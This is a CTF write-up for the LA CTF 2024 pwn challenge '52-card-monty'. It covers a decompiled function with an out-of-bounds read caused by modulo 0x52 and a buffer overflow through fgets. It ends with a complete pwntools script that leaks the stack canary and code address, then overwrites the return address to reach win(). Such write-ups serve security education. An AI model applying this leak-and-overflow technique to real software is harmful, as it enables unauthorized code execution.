---
title: 52-card-monty
date:  2024-02-25T20:00:00+02:00
description: Writeup for 52-card-monty [LA CTF 2024]
author: pinebel
tags:
- pwn
draft: false
---

## Challenge Description:

3-card monty was too easy for me so I made 52-card monty! Can you show me the lady?

## Intuition 

We are given an ELF 64-bit binary with the following protections:
```bash
└─$ checksec --file=monty 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   82 Symbols        No    0               2               monty

```


We can see that it has all the protections, after opening it in Ghidra we can see that there is also a win() function that prints the flag, so it's a ret2win challenge. The vulnerability is that we can leak some addresses from the stack. The array from which we can read cards has 52 elements but our input let us read 0x52 elements from the array. 

```C
void game(void)

{
  long lVar1;
  long *plVar2;
  long in_FS_OFFSET;
  int local_1d8;
  int local_1d4;
  long local_1d0;
  long local_1c8 [52];
  char local_28 [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  plVar2 = local_1c8;
  for (lVar1 = 0x34; lVar1 != 0; lVar1 = lVar1 + -1) {
    *plVar2 = 0;
    plVar2 = plVar2 + 1;
  }
  for (local_1d4 = 0; local_1d4 < 0x34; local_1d4 = local_1d4 + 1) {
    lVar1 = lrand();
    local_1c8[local_1d4] = lVar1;
  }
  local_1d8 = rand();
  local_1d8 = local_1d8 % 0x34;
  local_1c8[local_1d8] = 0x423a35c7;
  puts("==============================");
  printf("index of your first peek? ");
  __isoc99_scanf(&DAT_0010206a,&local_1d8);
  local_1d0 = local_1c8[local_1d8 % 0x52];
  local_1c8[local_1d8 % 0x52] = local_1c8[0];
  local_1c8[0] = local_1d0;
  printf("Peek 1: %lu\n",local_1d0);
  puts("==============================");
  printf("index of your second peek? ");
  __isoc99_scanf(&DAT_0010206a,&local_1d8);
  local_1d0 = local_1c8[local_1d8 % 0x52];
  local_1c8[local_1d8 % 0x52] = local_1c8[0];
  local_1c8[0] = local_1d0;
  printf("Peek 2: %lu\n",local_1d0);
  puts("==============================");
  printf("Show me the lady! ");
  __isoc99_scanf(&DAT_0010206a,&local_1d8);
  puts("==============================");
  if (local_1c8[local_1d8] == 0x423a35c7) {
    puts("You win!");
  }
  else {
    puts("Just missed. Try again.");
  }
  puts("==============================");
  puts("Add your name to the leaderboard.");
  getchar();
  printf("Name: ");
  fgets(local_28,0x34,stdin);
  puts("==============================");
  printf("Thanks for playing, %s!\n",local_28);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

We can leak two addresses from the stack with the peeks the binary allows us to do, then we are asked for the index where the lady card is but this isn't important for our exploit. After this we are asked for our name.

### Solution

To solve this challenge with the two peeks I leak the main address and the canary and then I send the payload when we are asked for our name. 

```py
from pwn import *


def get_peek_address(output):
    print(output)
    temp = output[9:-1]
    temp = temp.decode()
    return hex(int(temp))


target = process("./monty")
target = remote("chall.lac.tf",31132)

target.sendlineafter(b"peek?",b"57") # index for main  is 57
main = hex(int(get_peek_address(target.recvline()),16) - 0x30)
print(main)

target.sendlineafter(b"peek?",b"55") # index for canary is 55 
canary = get_peek_address(target.recvline())
print(canary)

target.sendlineafter(b"lady!",b"1")
print(target.recvline())

# gdb.attach(target)
# pause()

flag = int(main,16) - 0x415 # distance from main to flag
print(hex(flag))
payload = b"A"*24 + p64(int(canary,16)) + p64(flag) + p64(flag)
target.sendlineafter(b"Name:",payload)
#print(target.recvline())

target.interactive()

```